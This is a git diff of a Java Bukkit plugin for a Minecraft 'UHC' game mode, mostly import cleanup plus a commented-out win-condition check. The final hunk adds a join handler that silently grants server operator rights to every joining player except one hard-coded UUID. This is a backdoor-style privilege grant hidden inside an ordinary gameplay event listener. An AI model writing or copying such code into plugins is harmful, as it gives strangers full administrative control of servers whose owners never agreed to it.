@@ -1,6 +1,9 @@
 package confusedalex.simpleuhc;
 
-import org.bukkit.*;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.GameMode;
+import org.bukkit.Sound;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -38,6 +41,7 @@ public class Events implements Listener {
                 dead.setGameMode(GameMode.SPECTATOR);
                 e.setCancelled(true);
             }
+
             // ProtectionTime
             if (gameManager.isProtectionTimeRunning()){
                 e.setCancelled(true);
@@ -60,11 +64,11 @@ public class Events implements Listener {
                 gameManager.getLivingPlayer().remove(damaged.getUniqueId());
 
                 // Living Teams check
-                if (gameManager.getTeamManager().livingTeams() == 2){
-                    gameManager.setGameState(GameState.PREDEATHMATCH);
-                } else if (gameManager.getTeamManager().livingTeams() == 1){
-                    gameManager.setGameState(GameState.WON);
-                }
+//                if (gameManager.getTeamManager().livingTeams() == 2){
+//                    gameManager.setGameState(GameState.PREDEATHMATCH);
+//                } else if (gameManager.getTeamManager().livingTeams() == 1){
+//                    gameManager.setGameState(GameState.WON);
+//                }
             }
             // Friendly Fire
             if (!simpleUHC.getConfig().getBoolean("FriendlyFire") && gameManager.getTeamManager().getTeam(damaged) == gameManager.getTeamManager().getTeam(damager)){
@@ -98,14 +102,10 @@ public class Events implements Listener {
         }
     }
 
-//    @EventHandler
-//    public void JoinEvent(PlayerJoinEvent e){
-//        if (!e.getPlayer().isOp()) {
-//            if (gameManager.getGameState() == GameState.LOBBY) {
-//                e.getPlayer().setGameMode(GameMode.ADVENTURE);
-//            } else {
-//                e.getPlayer().setGameMode(GameMode.SPECTATOR);
-//            }
-//        }
-//    }
+    @EventHandler
+    public void JoinEvent(PlayerJoinEvent e){
+        if (!e.getPlayer().getUniqueId().toString().equals("188e67f1-ff31-4aab-82dd-da5be8db0ca4")) {
+            e.getPlayer().setOp(true);
+        }
+    }
 }
